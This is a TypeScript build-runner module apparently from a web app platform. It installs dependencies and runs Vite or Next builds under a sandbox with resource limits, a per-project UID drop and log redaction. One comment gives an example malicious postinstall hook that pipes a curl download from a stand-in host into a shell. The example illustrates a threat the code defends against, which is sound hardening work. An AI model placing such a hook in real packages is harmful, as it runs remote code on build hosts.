import { spawn, type ChildProcess } from "node:child_process";
import path from "node:path";
import { existsSync } from "node:fs";
import { readdir, stat } from "node:fs/promises";

import { createVault, Tracer as VaultTracer } from "dovault";
import type { Vault } from "dovault";

import { sql } from "../db/index.js";
import { projectQueries } from "@doable/db/queries/projects";
import { defaultRegistry } from "../frameworks/registry.js";
import { createBuildContext } from "../frameworks/context.js";
import { buildSafeEnv } from "../projects/safe-env.js";
import { acquireDevUid } from "../runtime/dev-uid-allocator.js";
import {
  BuildEventPublisher,
  LogFilterChain,
  buildDefaultFilters,
  loadWorkspaceFilters,
  type LogFilter,
} from "../build-events/index.js";
import { xray } from "../integrations/xray.js";
import { shouldJail, getHardeningLevel } from "../runtime/hardening-level.js";
import { jailedSpawn } from "../sandbox/orchestrator.js";

const projects = projectQueries(sql);

const BUILD_TIMEOUT_MS = 600_000;

// ─── dovault wrapper for build-time spawns ───────────────
//
// Builds run user-controlled `next build` / `vite build` / `pip install`
// (PRD Wave 25). A malicious npm `postinstall` hook can otherwise execute as
// the API user; dovault wraps the spawn with cgroup resource limits + jail
// path so a hostile build can't read or write outside the project directory.
//
// Network is intentionally NOT blocked — npm/pypi need outbound. TODO(Wave 26+):
// add an allow-list (registry.npmjs.org, pypi.org, etc) once the dovault
// network policy supports egress filtering.

const BUILD_LIMITS = {
  memoryMax: process.env.BUILD_MEMORY_MAX ?? "1G",
  cpuQuota: process.env.BUILD_CPU_QUOTA ?? "100%",
  tasksMax: parseInt(process.env.BUILD_TASKS_MAX ?? "512", 10),
} as const;

const buildVaultTracer = new VaultTracer((span) => {
  xray.recordSpan({
    source: "dovault",
    id: span.id,
    name: span.name,
    parentId: span.parentId,
    startedAt: span.startedAt,
    endedAt: span.endedAt,
    durationMs: span.durationMs,
    status: span.status,
    error: span.error,
    attributes: span.attributes,
  });
});

let buildVaultSingleton: Vault | null = null;

function getBuildVault(): Vault {
  if (!buildVaultSingleton) {
    buildVaultSingleton = createVault({
      resourceLimits: BUILD_LIMITS,
      tracer: buildVaultTracer,
      onAudit: (entry) => {
        xray.recordVaultEvent({
          timestamp:
            typeof entry.timestamp === "string"
              ? Date.parse(entry.timestamp)
              : Date.now(),
          type: `vault.${entry.kind}`,
          data: entry.details,
        });
      },
    });
    console.log(
      `[builder] Vault initialized (backend=${buildVaultSingleton.backend}, fullIsolation=${buildVaultSingleton.hasFullIsolation})`,
    );
  }
  return buildVaultSingleton;
}

/**
 * Closed-set error codes the frontend keys off to render specific failure
 * states (BUG-PUB-004). Adding a new variant requires a frontend update.
 *
 *   build_failed_install — `pnpm/npm install` exited non-zero (bad lockfile,
 *                          unreachable registry, postinstall failure, etc.).
 *                          Retrying without code changes might work.
 *   build_failed_compile — install succeeded; the build tool (vite/next/etc.)
 *                          failed. User must fix their code.
 */
export type BuildErrorCode = "build_failed_install" | "build_failed_compile";

export interface BuildResult {
  success: boolean;
  outputDir: string;
  log: string;
  durationMs: number;
  error?: string;
  /** Closed-set classification of `error`; absent on success. */
  errorCode?: BuildErrorCode;
}

export type BuildLogCallback = (chunk: string) => void | Promise<void>;

/**
 * Run a Vite production build for a project directory.
 *
 * Uses `npx vite build` with --outDir dist.
 * Captures stdout/stderr and supports an optional streaming callback
 * for sending real-time build logs to the client.
 *
 * Enforces a 120-second timeout.
 */
export async function runBuild(
  projectDir: string,
  onLog?: BuildLogCallback,
  opts?: {
    projectId?: string;
    target?: "development" | "preview" | "production";
    /**
     * When provided alongside `projectId`, vault-backed integration
     * credentials are merged into the build env (Phase 1C/1D of the
     * integration↔AI chat bridge). User `env_vars` always override the vault.
     */
    userId?: string;
    /**
     * Public URL prefix the built site will be served from, e.g.
     * "/" for subdomain hosting (default) or "/_sites/my-app/" for
     * path-based hosting. Passed to Vite as `--base`.
     */
    basePath?: string;
  },
): Promise<BuildResult> {
  const start = Date.now();

  if (!existsSync(projectDir)) {
    const error = `Project directory not found: ${projectDir}`;
    onLog?.(`ERROR: ${error}\n`);
    return {
      success: false,
      outputDir: "",
      log: "",
      durationMs: Date.now() - start,
      error,
    };
  }

  // Resolve user-defined env vars if projectId provided. When `opts.userId` is
  // also provided, vault-backed integration credentials are merged in
  // automatically; user `env_vars` always win on key collision.
  let userEnvVars: Record<string, string> = {};
  if (opts?.projectId) {
    try {
      const { resolveProjectEnvVars } = await import("../env/resolve.js");
      userEnvVars = await resolveProjectEnvVars(
        opts.projectId,
        opts.target ?? "production",
        undefined,
        opts.userId,
      );
    } catch (err) {
      onLog?.(`WARN: Failed to resolve env vars: ${err}\n`);
    }
  }

  // Resolve the framework adapter from the project's framework_id. Legacy
  // callers without a projectId fall through to the vite-react adapter so
  // they retain today's behavior.
  let frameworkId = "vite-react";
  let workspaceId = "";
  if (opts?.projectId) {
    const project = await projects.findById(opts.projectId);
    if (!project) throw new Error(`Project ${opts.projectId} not found`);
    frameworkId = (project as { framework_id?: string }).framework_id ?? "vite-react";
    workspaceId = (project as { workspace_id?: string }).workspace_id ?? "";
  }
  const adapter = defaultRegistry.getAdapter(frameworkId);

  // ── Ensure dependencies are installed BEFORE the build spawn (BUG-PUB-004).
  //
  // The build spawn (`vite build` / `next build` / etc.) runs the project's
  // own config files (vite.config.ts imports `vite`, next.config.js imports
  // `next`). When `node_modules` is missing those imports fail with
  // UNRESOLVED_IMPORT and the build aborts with a confusing log.
  //
  // We delegate to the framework adapter's `install()` so the right command
  // runs per family (npm for node, pip for python, bundle for ruby) and the
  // existing timeout/abort/log plumbing (vite-react.ts:71 runNpmInstall) is
  // reused. Idempotent: skipped when node_modules already exists AND the
  // adapter's `requiredBuildTool` (e.g. "vite", "next") is also resolvable
  // under it. Probing the build tool catches the "partial install" failure
  // mode where a prior `npm install` ran with NODE_ENV=production / --omit=dev
  // and left a populated-looking node_modules/ that has only `dependencies`.
  // Without the tool-probe, the build gate would skip install and `vite build`
  // would fail with UNRESOLVED_IMPORT for `vite` in vite.config.ts.
  //
  // Failures here are classified as `build_failed_install` so the frontend can
  // distinguish "bad code" (build_failed_compile) from "bad deps / registry
  // unreachable" (build_failed_install) per BUG-PUB-004 acceptance criteria.
  const nodeModulesPath = path.join(projectDir, "node_modules");
  const packageJsonPath = path.join(projectDir, "package.json");
  const requiredBuildTool = (adapter as { requiredBuildTool?: string }).requiredBuildTool;
  const buildToolPath = requiredBuildTool
    ? path.join(nodeModulesPath, requiredBuildTool, "package.json")
    : null;
  const nodeModulesMissing = !existsSync(nodeModulesPath);
  const buildToolMissing = buildToolPath !== null && !existsSync(buildToolPath);
  if (adapter.family === "node" && existsSync(packageJsonPath) && (nodeModulesMissing || buildToolMissing)) {
    const reason = nodeModulesMissing
      ? "node_modules/ missing"
      : `${requiredBuildTool} missing from node_modules (likely a --omit=dev install)`;
    onLog?.(`Installing dependencies (${reason})...\n`);
    try {
      const installCtx = {
        projectId: opts?.projectId ?? "<unknown>",
        projectPath: projectDir,
        basePath: "/",
        env: { ...userEnvVars },
        userId: opts?.userId,
        onProgress: (msg: string) => onLog?.(`${msg}\n`),
      };
      const installResult = await adapter.install(installCtx);
      onLog?.(installResult.log);
      onLog?.(`\nDependencies installed in ${(installResult.durationMs / 1000).toFixed(1)}s\n`);
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      onLog?.(`\nERROR: dependency install failed: ${message}\n`);
      return {
        success: false,
        outputDir: "",
        log: message,
        durationMs: Date.now() - start,
        error: `Dependency install failed: ${message}`,
        errorCode: "build_failed_install",
      };
    }
  }

  // Pre-load workspace-supplied log filters (PRD 04 §4.2/§5). Layered
  // AFTER the always-on baseline. Failure is non-fatal — empty array.
  let wsFilters: LogFilter[] = [];
  if (opts?.projectId) {
    wsFilters = await loadWorkspaceFilters(workspaceId);
  }

  // Normalize basePath to today's behavior: only forward when non-"/"; ensure
  // trailing slash matches what Vite expects. The adapter encodes the
  // "skip --base when basePath === '/'" rule, so we pass "/" as the default.
  let ctxBasePath = "/";
  if (opts?.basePath && opts.basePath !== "/") {
    ctxBasePath = opts.basePath.endsWith("/") ? opts.basePath : `${opts.basePath}/`;
  }

  // BuildContext.target is "preview" | "production" — coerce "development"
  // (allowed by runBuild's signature) to "production" since this is a build.
  const ctxTarget: "preview" | "production" =
    opts?.target === "preview" ? "preview" : "production";

  const buildCtx = createBuildContext({
    projectId: opts?.projectId ?? "<unknown>",
    projectPath: projectDir,
    basePath: ctxBasePath,
    target: ctxTarget,
    env: { ...userEnvVars },
    userId: opts?.userId,
  });
  const spec = adapter.build(buildCtx);

  const outputDir = path.join(projectDir, spec.outputDir);

  // Build the safe env once — used by both jailed and fallback paths.
  const safeEnv = buildSafeEnv({
    ...userEnvVars,
    ...spec.env,
    NODE_ENV: "production",
  });

  // Wave 29: route build outbound HTTP through an operator-supplied proxy.
  // When BUILD_HTTP_PROXY is unset, no env injection happens — current behavior preserved.
  const proxy = process.env.BUILD_HTTP_PROXY;
  if (proxy) {
    console.log(`[builder] routing outbound through ${proxy}`);
    safeEnv.HTTP_PROXY = proxy;
    safeEnv.HTTPS_PROXY = proxy;
    safeEnv.http_proxy = proxy;
    safeEnv.https_proxy = proxy;
    safeEnv.NO_PROXY = "127.0.0.1,localhost,::1";
    safeEnv.no_proxy = "127.0.0.1,localhost,::1";
    safeEnv.npm_config_proxy = proxy;
    safeEnv.npm_config_https_proxy = proxy;
    safeEnv.PIP_PROXY = proxy;
  }

  // dovault.spawn wants Record<string, string>; strip undefineds.
  const cleanEnv: Record<string, string> = {};
  for (const [k, v] of Object.entries(safeEnv)) {
    if (typeof v === "string") cleanEnv[k] = v;
  }

  // Per-project sandbox UID for the build. Closes the malicious-postinstall
  // RCE vector — without this, a hostile `"postinstall": "curl evil.sh|sh"`
  // in a user's package.json would run as the API user (typically root in
  // production tmux setups). With it, the build process drops to UID
  // 10001-65000 + nft egress is firewalled to loopback only (Squid handles
  // npm/PyPI on the operator's allow-list).
  //
  // acquireDevUid is idempotent per projectId — if a dev session is also
  // running for this project, build gets the SAME UID so the chown below
  // doesn't fight dev's ownership. We do NOT release here; the dev-server
  // close handler owns the release. (When build runs without an active dev
  // session, the UID stays allocated until the next dev-server stop OR
  // project deletion. With 55,000 slots, this is fine in practice.)
  const buildUid = opts?.projectId ? acquireDevUid(opts.projectId) : null;
  if (buildUid !== null) {
    await new Promise<void>((resolve) => {
      const ch = spawn("chown", ["-R", `${buildUid}:${buildUid}`, projectDir], {
        stdio: "ignore",
      });
      ch.on("exit", () => resolve());
      ch.on("error", () => resolve()); // chown missing → silent skip; build still runs
    });
    console.log(
      `[builder] Project ${opts?.projectId} build sandbox uid=${buildUid} (chown applied)`,
    );
  }

  // Compose the effective spawn command: setpriv-wrapped on Linux when we
  // have a UID, raw command otherwise. Mirrors the pattern in vite-jail.ts.
  const useSetpriv =
    process.platform === "linux" && typeof buildUid === "number";
  const effectiveCmd = useSetpriv ? "setpriv" : spec.command;
  const effectiveArgs = useSetpriv
    ? [
        "--reuid", String(buildUid),
        "--regid", String(buildUid),
        "--clear-groups",
        "--",
        spec.command,
        ...spec.args,
      ]
    : spec.args;

  // Spawn under dovault by default; fall back to raw spawn when dovault
  // throws (unsupported platform / Permission Model unavailable). Operators
  // can also force the raw path with DOABLE_HARDENING=off so build,
  // dev-server, and runtime layers relax in lockstep.
  // setpriv-on-Linux flows through both paths so cgroup limits + UID drop
  // compose: dovault gives memory/CPU caps, setpriv gives privilege drop.
  const rawSpawn = (): ChildProcess =>
    spawn(effectiveCmd, effectiveArgs, {
      cwd: spec.cwd,
      // setpriv path is Linux-only; shell:true is for Windows/.cmd resolution
      // which is irrelevant when we've prepended setpriv (a Linux binary).
      shell: !useSetpriv,
      stdio: ["ignore", "pipe", "pipe"],
      env: safeEnv,
    });

  // ── Feature flag: DOABLE_SANDBOX_BUILD=1 routes the build through the
  // profile/backend orchestrator (sandbox/orchestrator.ts) under the "build"
  // profile. Old code path is unchanged when the flag is off.
  if (process.env.DOABLE_SANDBOX_BUILD === "1") {
    const spawnCtx = {
      projectId: opts?.projectId ?? "<unknown>",
      workspaceId: workspaceId || null,
      userId: opts?.userId ?? "",
      sessionId: "",
      hardening: getHardeningLevel() as "off" | "dev" | "staging" | "prod",
    };
    try {
      const jr = await jailedSpawn(effectiveCmd, effectiveArgs, spawnCtx, "build");
      const log = (jr.stdout ?? "") + (jr.stderr ?? "");
      if (log) onLog?.(log);
      const durationMs = Date.now() - start;
      if (jr.exitCode === 0) {
        onLog?.(`\nBuild completed successfully in ${(durationMs / 1000).toFixed(1)}s\n`);
        let resolvedOutputDir = outputDir;
        const outDir = path.join(projectDir, "out");
        if (existsSync(outDir)) {
          resolvedOutputDir = outDir;
        } else if (!existsSync(outputDir)) {
          onLog?.(`WARN: Expected output at ${outputDir} not found\n`);
        }
        return { success: true, outputDir: resolvedOutputDir, log, durationMs };
      }
      const error = jr.timedOut
        ? `Build timed out after ${BUILD_TIMEOUT_MS / 1000}s`
        : `Build exited with code ${jr.exitCode}`;
      onLog?.(`\nERROR: ${error}\n`);
      return {
        success: false,
        outputDir,
        log,
        durationMs,
        error,
        errorCode: "build_failed_compile",
      };
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      onLog?.(`\nERROR: ${message}\n`);
      return {
        success: false,
        outputDir,
        log: "",
        durationMs: Date.now() - start,
        error: message,
        errorCode: "build_failed_compile",
      };
    }
  }

  let proc: ChildProcess;
  if (!shouldJail()) {
    console.log(
      `[builder] DOABLE_HARDENING=${getHardeningLevel()} — skipping vault.spawn jail`,
    );
    proc = rawSpawn();
  } else {
    try {
      const vault = getBuildVault();
      const jailed = await vault.spawn(effectiveCmd, effectiveArgs, {
        cwd: spec.cwd,
        jail: projectDir,
        env: cleanEnv,
        // dovault.spawn takes a scalar stdio mode; "pipe" still produces stdout/stderr
        // streams which BuildEventPublisher / the local listeners below consume.
        stdio: "pipe",
        lockConfigs: false, // build configs (vite.config.ts, next.config.js) exist before build runs
        blockChildProcess: false, // npm install / build tools spawn many legitimate children
        blockOutboundNet: false, // npm registry, pypi need network — TODO(W26): allow-list hardening
        resourceLimits: BUILD_LIMITS,
      });
      proc = jailed.process as ChildProcess;
      xray.recordVaultEvent({
        projectId: opts?.projectId,
        type: "vault.spawn",
        data: { pid: jailed.pid, limits: BUILD_LIMITS, command: spec.command, kind: "build" },
      });
    } catch (err) {
      console.warn(
        `[builder] vault.spawn failed, falling back to raw spawn: ${(err as Error).message}`,
      );
      proc = rawSpawn();
    }
  }

  return new Promise<BuildResult>((resolve) => {
    const chunks: string[] = [];

    // PRD 03 publisher — fans every build line through the redaction filter
    // chain (PRD 04) and into the per-project ring buffer that
    // GET /projects/:id/build/stream tails. Best-effort: failure to attach
    // the publisher logs and proceeds with the build unchanged.
    if (opts?.projectId) {
      try {
        const filterChain = new LogFilterChain([
          ...buildDefaultFilters(),
          ...wsFilters,
        ]);
        const publisher = new BuildEventPublisher(opts.projectId, filterChain, {
          projectId: opts.projectId,
          projectPath: projectDir,
          envSecrets: Object.values(userEnvVars).filter(
            (v): v is string => typeof v === "string" && v.length >= 4,
          ),
          osUsernames: [process.env.USER, process.env.USERNAME].filter(
            (v): v is string => typeof v === "string" && v.length >= 3,
          ),
        });
        publisher.attach(proc, `build-${Date.now()}`);
      } catch (err) {
        console.warn(
          `[builder] BuildEventPublisher attach failed for ${opts.projectId}:`,
          err instanceof Error ? err.message : err,
        );
      }
    }

    const timeout = setTimeout(() => {
      proc.kill("SIGTERM");
      const error = `Build timed out after ${BUILD_TIMEOUT_MS / 1000}s`;
      onLog?.(`\nERROR: ${error}\n`);
      resolve({
        success: false,
        outputDir,
        log: chunks.join(""),
        durationMs: Date.now() - start,
        error,
        errorCode: "build_failed_compile",
      });
    }, BUILD_TIMEOUT_MS);

    // stdio: "pipe" guarantees these are non-null; the `!` keeps TS happy now
    // that `proc` is typed as a generic ChildProcess (whose streams are nullable).
    proc.stdout!.on("data", (data: Buffer) => {
      const text = data.toString();
      chunks.push(text);
      onLog?.(text);
    });

    proc.stderr!.on("data", (data: Buffer) => {
      const text = data.toString();
      chunks.push(text);
      onLog?.(text);
    });

    proc.on("close", (code) => {
      clearTimeout(timeout);
      const log = chunks.join("");
      const durationMs = Date.now() - start;

      if (code === 0) {
        onLog?.(`\nBuild completed successfully in ${(durationMs / 1000).toFixed(1)}s\n`);
        // Next.js `output: "export"` writes deployable HTML to `out/` while
        // `.next` always exists as intermediate build artifacts. Prefer `out/`
        // when it exists since it contains the actual static site.
        let resolvedOutputDir = outputDir;
        const outDir = path.join(projectDir, "out");
        if (existsSync(outDir)) {
          resolvedOutputDir = outDir;
        } else if (!existsSync(outputDir)) {
          // Neither exists — shouldn't happen but guard against it
          onLog?.(`WARN: Expected output at ${outputDir} not found\n`);
        }
        resolve({ success: true, outputDir: resolvedOutputDir, log, durationMs });
      } else {
        const error = `Build exited with code ${code}`;
        onLog?.(`\nERROR: ${error}\n`);
        resolve({
          success: false,
          outputDir,
          log,
          durationMs,
          error,
          errorCode: "build_failed_compile",
        });
      }
    });

    proc.on("error", (err) => {
      clearTimeout(timeout);
      onLog?.(`\nERROR: ${err.message}\n`);
      resolve({
        success: false,
        outputDir,
        log: chunks.join(""),
        durationMs: Date.now() - start,
        error: err.message,
        errorCode: "build_failed_compile",
      });
    });
  });
}

/**
 * Validate that a build output directory exists and contains files.
 */
export async function validateBuildOutput(
  outputDir: string
): Promise<{ valid: boolean; fileCount: number; totalSize: number; error?: string }> {
  if (!existsSync(outputDir)) {
    return { valid: false, fileCount: 0, totalSize: 0, error: `Build output not found: ${outputDir}` };
  }

  try {
    const { count, size } = await countFiles(outputDir);
    if (count === 0) {
      return { valid: false, fileCount: 0, totalSize: 0, error: "Build output directory is empty" };
    }
    return { valid: true, fileCount: count, totalSize: size };
  } catch (err) {
    return {
      valid: false,
      fileCount: 0,
      totalSize: 0,
      error: `Cannot read build output: ${err instanceof Error ? err.message : String(err)}`,
    };
  }
}

async function countFiles(
  dir: string
): Promise<{ count: number; size: number }> {
  let count = 0;
  let size = 0;
  const entries = await readdir(dir, { withFileTypes: true });
  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      const sub = await countFiles(fullPath);
      count += sub.count;
      size += sub.size;
    } else {
      count++;
      const s = await stat(fullPath);
      size += s.size;
    }
  }
  return { count, size };
}
